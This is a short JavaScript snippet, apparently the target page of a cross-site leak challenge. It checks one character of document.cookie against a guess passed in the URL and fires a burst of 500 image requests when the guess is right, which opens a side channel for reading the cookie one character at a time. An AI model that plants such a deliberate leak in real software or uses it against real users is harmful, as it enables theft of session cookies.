function bk(){ for (var i=0;i<500;i++){ new Image().src="/?i="+i } }
function Xg(variable){
       var vars = window.location.search.substring(1).split("&");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split("=");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}

var pos = Xg('p') || 0;
var chr = Xg('c');
if (document.cookie[pos] == chr) { bk() }

